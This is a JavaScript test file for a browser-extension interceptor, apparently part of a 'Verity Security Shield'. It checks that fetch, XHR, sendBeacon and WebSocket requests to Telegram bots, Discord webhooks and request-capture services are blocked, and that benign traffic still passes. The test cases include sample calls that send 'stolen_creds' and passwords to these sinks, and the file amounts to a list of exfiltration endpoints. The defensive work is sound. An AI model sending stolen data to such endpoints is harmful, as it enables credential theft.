import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { fileURLToPath } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const interceptorCode = fs.readFileSync(
  path.resolve(__dirname, '../content/main-world-interceptor.js'),
  'utf8'
);

/**
 * Creates an isolated Node vm sandbox simulating a webpage's MAIN world runtime
 * with stubbed window, fetch, XMLHttpRequest, navigator.sendBeacon, and WebSocket.
 */
function createSandbox(initialLocation = 'https://victim-phish-portal.xyz/login.html') {
  const fetchCalls = [];
  const xhrCalls = [];
  const beaconCalls = [];
  const wsCalls = [];
  const dispatchedThreats = [];

  class MockDOMException extends Error {
    constructor(message, name = 'Error') {
      super(message);
      this.name = name;
    }
  }

  class MockCustomEvent {
    constructor(type, init = {}) {
      this.type = type;
      this.detail = init.detail || {};
    }
  }

  function MockXHR() {
    this._method = 'GET';
    this._url = '';
  }
  MockXHR.prototype.open = function (method, url) {
    this._method = method;
    this._url = url;
  };
  MockXHR.prototype.send = function (body) {
    xhrCalls.push({ method: this._method, url: this._url, body });
  };

  function MockWebSocket(url, protocols) {
    this.url = url;
    this.protocols = protocols;
    this.readyState = MockWebSocket.OPEN;
    wsCalls.push({ url, protocols });
  }
  MockWebSocket.CONNECTING = 0;
  MockWebSocket.OPEN = 1;
  MockWebSocket.CLOSING = 2;
  MockWebSocket.CLOSED = 3;
  MockWebSocket.prototype.send = function (data) {
    this._lastSent = data;
  };
  MockWebSocket.prototype.close = function () {
    this.readyState = MockWebSocket.CLOSED;
  };

  const parsedUrl = new URL(initialLocation);
  const mockLocation = {
    hostname: parsedUrl.hostname,
    href: parsedUrl.href
  };

  const sandbox = {
    location: mockLocation,
    CustomEvent: MockCustomEvent,
    DOMException: typeof DOMException !== 'undefined' ? DOMException : MockDOMException,
    TypeError,
    URL,
    fetch: function (resource, init) {
      const url = typeof resource === 'string' ? resource : (resource ? resource.url : '');
      fetchCalls.push({ url, init });
      return Promise.resolve({ ok: true, status: 200, url });
    },
    XMLHttpRequest: MockXHR,
    navigator: {
      sendBeacon: function (url, data) {
        beaconCalls.push({ url: String(url), data });
        return true;
      },
      clipboard: {
        writeText: async () => {}
      },
      mediaDevices: {},
      serviceWorker: {}
    },
    WebSocket: MockWebSocket,
    document: {
      addEventListener: () => {},
      removeEventListener: () => {},
      body: { innerText: 'Sample webpage body' }
    },
    Element: {
      prototype: {
        attachShadow: function (init) { return { mode: init.mode }; }
      }
    },
    Node: {
      prototype: {
        appendChild: function (c) { return c; },
        insertBefore: function (c) { return c; }
      }
    },
    HTMLAnchorElement: {
      prototype: {
        click: function () {}
      }
    },
    Notification: {
      requestPermission: () => Promise.resolve('granted')
    },
    // Tracking spies
    fetchCalls,
    xhrCalls,
    beaconCalls,
    wsCalls,
    dispatchedThreats
  };

  sandbox.window = sandbox;
  sandbox.global = sandbox;
  sandbox.globalThis = sandbox;
  sandbox.dispatchEvent = function (event) {
    if (event.type === '__VERITY_RUNTIME_THREAT__') {
      dispatchedThreats.push(event.detail);
    }
    return true;
  };

  const context = vm.createContext(sandbox);
  vm.runInContext(interceptorCode, context);
  return sandbox;
}

test('Main World Interceptor: fetch hook blocks Telegram & Discord webhooks and permits benign traffic', async () => {
  const sb = createSandbox();

  // 1. Blocked exfiltration endpoints (Telegram / Discord)
  await assert.rejects(
    () => sb.fetch('https://api.telegram.org/bot123456:ABC-DEF/sendMessage?chat_id=123&text=stolen_creds'),
    /Blocked by Verity Security Shield/
  );
  await assert.rejects(
    () => sb.fetch('https://discord.com/api/webhooks/987654321/token-secret-xyz'),
    /Blocked by Verity Security Shield/
  );
  await assert.rejects(
    () => sb.fetch('https://discordapp.com/api/webhooks/987654321/token-secret-xyz'),
    /Blocked by Verity Security Shield/
  );

  // 2. Benign traffic passes untouched
  const benignRes = await sb.fetch('https://api.example.com/v1/user/profile');
  assert.equal(benignRes.ok, true);
  assert.equal(sb.fetchCalls.length, 1);
  assert.equal(sb.fetchCalls[0].url, 'https://api.example.com/v1/user/profile');

  // Verify threat signals emitted
  assert.ok(sb.dispatchedThreats.some(t => t.signal === 'SIG_PHISHING_KIT_WEBHOOK_EXFIL' && t.endpoint.includes('api.telegram.org')));
  assert.ok(sb.dispatchedThreats.some(t => t.signal === 'SIG_PHISHING_KIT_WEBHOOK_EXFIL' && t.endpoint.includes('discord.com')));
});

test('Main World Interceptor: XMLHttpRequest hook blocks Telegram & Discord exfiltration and permits benign calls', () => {
  const sb = createSandbox();

  // 1. Blocked exfiltration endpoints (Telegram / Discord)
  const xhrTelegram = new sb.XMLHttpRequest();
  xhrTelegram.open('POST', 'https://api.telegram.org/bot987654:XYZ/sendMessage');
  assert.throws(
    () => xhrTelegram.send('payload=stolen_password'),
    /Blocked by Verity Security Shield/
  );

  const xhrDiscord = new sb.XMLHttpRequest();
  xhrDiscord.open('POST', 'https://discord.com/api/webhooks/111222333/token');
  assert.throws(
    () => xhrDiscord.send(JSON.stringify({ content: 'credentials' })),
    /Blocked by Verity Security Shield/
  );

  // 2. Benign traffic passes untouched
  const xhrBenign = new sb.XMLHttpRequest();
  xhrBenign.open('GET', 'https://bank.example.com/api/balance');
  assert.doesNotThrow(() => xhrBenign.send());

  assert.equal(sb.xhrCalls.length, 1);
  assert.equal(sb.xhrCalls[0].url, 'https://bank.example.com/api/balance');
  assert.ok(sb.dispatchedThreats.some(t => t.signal === 'SIG_PHISHING_KIT_WEBHOOK_EXFIL' && t.endpoint.includes('discord.com')));
});

test('Main World Interceptor: navigator.sendBeacon hook blocks Telegram & Discord and allows benign beacons', () => {
  const sb = createSandbox();

  // 1. Blocked exfiltration endpoints
  const tgBlocked = sb.navigator.sendBeacon('https://api.telegram.org/bot123456:ABC/log', 'exfil_data');
  assert.equal(tgBlocked, false, 'sendBeacon to Telegram must return false when blocked');

  const dcBlocked = sb.navigator.sendBeacon('https://discord.com/api/webhooks/555/token', 'exfil_data');
  assert.equal(dcBlocked, false, 'sendBeacon to Discord must return false when blocked');

  // 2. Benign beacon passes untouched
  const benignAllowed = sb.navigator.sendBeacon('https://analytics.example.com/collect', 'event=pageview');
  assert.equal(benignAllowed, true, 'sendBeacon to benign endpoint must return true');

  assert.equal(sb.beaconCalls.length, 1);
  assert.equal(sb.beaconCalls[0].url, 'https://analytics.example.com/collect');
});

test('Main World Interceptor: WebSocket hook blocks Telegram & Discord exfiltration and preserves constructor mechanics', () => {
  const sb = createSandbox();

  // 1. Blocked WebSocket exfiltration endpoints
  assert.throws(
    () => new sb.WebSocket('wss://api.telegram.org/bot123456:ABC/stream'),
    /Blocked by Verity Security Shield/
  );

  assert.throws(
    () => new sb.WebSocket('wss://discord.com/api/webhooks/999/live'),
    /Blocked by Verity Security Shield/
  );

  assert.throws(
    () => new sb.WebSocket('wss://webhook.site/uuid-exfil-sink'),
    /Blocked by Verity Security Shield/
  );

  // 2. Benign WebSocket connections pass untouched
  let wsBenign;
  assert.doesNotThrow(() => {
    wsBenign = new sb.WebSocket('wss://echo.websocket.org', ['chat', 'v1']);
  });

  assert.ok(wsBenign, 'Benign WebSocket instance must be created');
  assert.equal(wsBenign.url, 'wss://echo.websocket.org');
  assert.deepEqual(wsBenign.protocols, ['chat', 'v1']);
  assert.equal(sb.wsCalls.length, 1);

  // 3. Static constants preserved
  assert.equal(sb.WebSocket.CONNECTING, 0, 'Static constant CONNECTING must be 0');
  assert.equal(sb.WebSocket.OPEN, 1, 'Static constant OPEN must be 1');
  assert.equal(sb.WebSocket.CLOSING, 2, 'Static constant CLOSING must be 2');
  assert.equal(sb.WebSocket.CLOSED, 3, 'Static constant CLOSED must be 3');

  // 4. Prototype and instanceof preserved
  assert.ok(wsBenign instanceof sb.WebSocket, 'instanceof sb.WebSocket must return true');

  // 5. Calling without new throws TypeError as per native WebSocket spec
  assert.throws(() => {
    sb.WebSocket('wss://echo.websocket.org');
  }, TypeError);

  // 6. Same-origin or normal wss passes untouched
  let wsSameOrigin;
  assert.doesNotThrow(() => {
    wsSameOrigin = new sb.WebSocket('wss://victim-phish-portal.xyz/ws');
  });
  assert.ok(wsSameOrigin instanceof sb.WebSocket);

  // 7. Threat notification path verified
  const wsThreat = sb.dispatchedThreats.find(t => t.signal === 'SIG_PHISHING_KIT_WEBHOOK_EXFIL' && t.endpoint.includes('api.telegram.org'));
  assert.ok(wsThreat, 'WebSocket block must trigger SIG_PHISHING_KIT_WEBHOOK_EXFIL');
  assert.equal(wsThreat.endpoint, 'wss://api.telegram.org/bot123456:ABC/stream');
});

test('Main World Interceptor: Blocks all four channels on Pipedream, Hookbin, and RequestCatcher', async () => {
  const sb = createSandbox();

  // fetch
  await assert.rejects(() => sb.fetch('https://sub.pipedream.net/collector'), /Blocked by Verity/);

  // XHR
  const xhr = new sb.XMLHttpRequest();
  xhr.open('POST', 'https://hookbin.com/bin-id');
  assert.throws(() => xhr.send('data'), /Blocked by Verity/);

  // sendBeacon
  assert.equal(sb.navigator.sendBeacon('https://test.requestcatcher.com/test', 'data'), false);

  // WebSocket
  assert.throws(() => new sb.WebSocket('wss://sub.pipedream.net/ws'), /Blocked by Verity/);
});
